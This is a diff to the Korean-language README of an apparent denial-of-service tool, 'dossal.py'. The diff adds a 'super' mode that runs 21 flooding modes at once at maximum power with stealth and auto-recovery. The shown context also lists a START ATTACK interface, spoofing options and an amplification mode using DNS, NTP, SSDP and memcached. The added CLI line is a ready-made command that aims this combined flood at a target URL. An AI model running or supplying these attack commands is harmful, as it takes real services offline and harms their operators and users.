@@ -15,6 +15,9 @@ URL 입력 → START ATTACK 클릭. 체크박스로 스푸핑/스텔스/회복 �
 
 ### CLI
 ```bash
+# SUPER 모드 (21개 모드 동시, 최대 전력)
+python3 dossal.py --combo super --url https://target.com --duration 60
+
 # 단일 모드
 python3 dossal.py --mode raw --url http://target:8080 --duration 10 --threads 8
 
@@ -69,6 +72,7 @@ python3 dossal.py --dry-run --url https://target.com --threads 8
 | tls | httpsmp + h2 + udp (TLS fingerprint 랜덤화) |
 | proto | grpcmp + h2 + udp |
 | amplify | dns + icmp + ssdp + ntp + memcached |
+| super | 21개 모드 전부 (최대 전력 + 스텔스 + 자동회복) |
 
 ## 주요 옵션
 
